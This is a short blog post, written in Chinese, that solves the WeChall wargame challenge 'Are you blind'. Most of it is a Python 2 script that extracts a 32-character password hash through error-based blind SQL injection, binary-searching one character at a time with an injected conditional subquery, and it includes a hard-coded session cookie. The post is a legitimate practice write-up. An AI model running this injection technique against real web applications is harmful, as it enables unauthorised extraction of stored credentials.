---
title: Are your blind
author: rk700
layout: post
redirect_from: 
  - /writeup/2014/06/20/are-your-blind
  - /writeup/2014/06/20/are-your-blind/
tags:
  - sql
  - wechall
---
[http://www.wechall.net/challenge/Mawekl/are\_you\_blind/index.php][1]  
这道题还是盲注，32位的hash，128次跑完。这里我们用报错的方法来判断

下面是python代码

{% highlight python %}
#!/usr/bin/env python2

import urllib
import urllib2

def makePayload(statement):
    return "' or if(substring(password,%d,1)%s'%s',3,(select 1 union select 2))=3-- " % (statement[0], statement[1], statement[2])
    
def checkResponse(response):
    return response.find("Database error") == -1

def doAssert(statement):
    url = "http://www.wechall.net/challenge/Mawekl/are_you_blind/index.php"
    values = {'injection':makePayload(statement),'inject':'Inject'}
    data = urllib.urlencode(values)
    req = urllib2.Request(url, data)
    req.add_header('cookie','WC=7374566-11403-7iblKzppaCoukyl1')
    response = urllib2.urlopen(req)
    content = response.read()

    return checkResponse(content)
 
if __name__ == "__main__":
    alphalist = "0123456789ABCDEF"
    result = []
    for idx in range(1,33):
        start = 0
        end = 16 #[start, end)
        while (start < end):
            #print("[%d, %d)" % (start, end))
            if (end - start == 1):
                result.append(alphalist[start])
                print alphalist[start]
                break
            else:
                middle = (start + end)/2
                if(doAssert([idx, '<', alphalist[middle]])):
                    end = middle
                else:
                    start = middle
    print ''.join(result)
{% endhighlight %}

 [1]: http://www.wechall.net/challenge/Mawekl/are_you_blind/index.php
